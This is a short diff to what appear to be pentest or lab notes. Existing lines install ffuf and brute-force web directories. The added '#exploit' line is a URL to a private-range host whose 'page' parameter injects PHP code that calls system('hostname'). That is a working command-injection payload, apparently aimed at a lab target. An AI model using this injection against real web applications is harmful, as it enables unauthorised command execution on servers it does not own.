@@ -11,3 +11,6 @@ Directory BruteForce
 sudo apt update && sudo apt install ffuf -y
 
 ffuf -u http://<CHANGE TO YOUR IP>/FUZZ -w /usr/share/wordlists/dirb/common.txt -e .php,.html,.txt -mc 200,204,301,302
+
+#exploit
+http://192.168.107.134/index.php?page=index%27);echo%20system(%27hostname%27);//
